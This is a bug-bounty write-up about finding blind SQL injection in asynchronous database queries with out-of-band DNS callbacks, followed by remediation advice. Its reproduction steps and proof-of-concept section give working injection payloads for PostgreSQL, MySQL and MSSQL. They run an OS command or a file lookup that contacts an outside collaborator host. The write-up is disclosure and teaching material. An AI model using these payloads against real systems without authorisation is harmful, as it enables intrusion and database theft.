# Title: Super Blind SQL Injection via OAST Techniques - $20,000 Bounty

- **Platform**: HackerOne
- **Program**: Multiple Programs
- **Severity**: Critical
- **Date**: 2024-05-01
- **Researcher**: Priyanshu Shakya
- **Bounty**: $20,000 (combined across multiple reports)

## Summary
The researcher discovered that traditional time-based SQL injection payloads fail to detect SQL injection in asynchronous database operations. By using Out-of-Band Application Security Testing (OAST) techniques with DNS-based exfiltration, the researcher found SQL injection vulnerabilities across multiple programs, earning $20,000 in bounties within one month.

## Technical Details
The core insight was that many web applications perform database queries asynchronously. The user's request thread continues processing while a separate thread executes the SQL query. Time-based payloads return responses at normal speed because the delay happens in a different thread, making them invisible to the attacker.

The researcher studied PortSwigger's Web Security Academy material on blind SQL injection with out-of-band interaction. Using PostgreSQL's `COPY` function combined with `nslookup`, the researcher crafted payloads that triggered DNS lookups to Burp Collaborator:

```
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

When the vulnerable application processed this payload asynchronously, it executed the `nslookup` command, sending a DNS request to the researcher's Collaborator server.

## Steps to Reproduce
1. Set up Burp Suite with Collaborator client
2. Identify endpoints that accept user input for database operations
3. Send OAST-based SQL injection payload for each database type:
   - PostgreSQL: `copy (SELECT '') to program 'nslookup COLLABORATOR'`
   - MySQL: `LOAD_FILE('\\\\COLLABORATOR\\file')`
   - MSSQL: `exec master..xp_dirtree '//COLLABORATOR/'`
4. Monitor Collaborator for DNS/HTTP interactions
5. If interaction received, the endpoint is vulnerable despite time-based payloads failing

## Proof of Concept
PostgreSQL OAST payload:
```sql
'; copy (SELECT '') to program 'nslookup xyz.burpcollaborator.net' --
```

MySQL OAST payload:
```sql
'; LOAD_FILE('\\\\xyz.burpcollaborator.net\\test') --
```

MSSQL OAST payload:
```sql
'; exec master..xp_dirtree '//xyz.burpcollaborator.net/test' --
```

## Impact
- Detection of SQL injection in asynchronous database operations missed by traditional techniques
- Full database extraction via out-of-band channels
- Many previously "tested" endpoints were found vulnerable
- The technique works across MySQL, PostgreSQL, and MSSQL databases
- Thousands of targets might still be vulnerable to this technique

## Remediation
Developers should:
1. Use parameterized queries for all database operations
2. Implement proper input validation
3. Use WAF rules to detect OOB payloads
4. Restrict outbound network access from database servers
5. Audit all asynchronous database operations

## References
- https://medium.com/@pranshux0x/super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable-f9b013765448
